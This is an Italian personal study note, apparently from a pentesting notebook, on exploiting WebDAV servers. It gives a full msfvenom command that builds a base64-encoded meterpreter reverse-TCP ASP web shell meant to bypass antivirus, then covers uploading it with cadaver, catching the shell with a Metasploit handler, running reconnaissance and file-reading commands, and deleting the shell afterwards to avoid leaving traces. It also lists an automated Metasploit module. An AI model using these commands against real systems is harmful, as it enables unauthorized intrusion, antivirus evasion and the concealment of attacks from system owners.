### Exploit manuale

[https://www.notion.so/Vulnerability-Scanning-WebDAV-Vulnerabilities-185cfd48646780fbac2bfbeafd3e256e?pvs=4](https://www.notion.so/Vulnerability-Assessment-WebDAV-Vulnerabilities-185cfd48646780fbac2bfbeafd3e256e?pvs=21)

msfvenom+msfconsole

Se non abbiamo shell possiamo sempre crearla con [**msfvenom](https://www.notion.so/msfvenom-e416b809041a42678dd8f48e4a1d71f2?pvs=21) MA poi dovremo metterci in ascolto con un MODULO di meterpreter**

- **msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=XXXX  -f asp -e php/base64 > shellcodificata.asp**
    - **-e php/base64** salva exploit in formato base64 in modo da bipasare antivirus
    - **-f asp** crea shell in formato asp
- **cadaver http://IP_TARGET/webdav** inserire credenziali della directory wevdav
- **put /PATTERN_FILE/shellcodificata.asp** installa una webshell

avviare msfconsole

- **use exploit/multi/handler** per ricevere la connessione in arrivo dalla shell inserita nel target
- **use payload windows/meterpreter/reverse_tcp** mettere lo stesso utilizzato per creare shell su msfvenom
    - set LHOST
    - set LPORT
    - run

ORA OGNI VOLTA CHE AVVIEREMO SU FIREFOX IL FILE CONTENENTE LA SHELL POTREMO MANDARE COMANDI TRAMITE MSFCONSOLE

Alcuni comandi su shell creata 

- **whoami**
- **ipconfig**
- **shell**
- **dir C:\**
- **type C:\NOME_FILE_DA_LEGGERE**

ALLA FINE DELL’HACK:

- **delete FILE_SHELL.asp** cancellare sempre alla fine dell hack per evitare di lasciare tracce

### AUTOMATICO CON MSFCONSOLE

- **exploit/windows/iis/iis_webdav_upload_asp** automatizza tutto ed ottiene shell
    - **set RHOSTS**
    - **set HttpUsername**
    - **set HttpPassword**
    - **set PATH /webdav/DARE_UN_NOME_AL_FILE.asp**
    - **run**
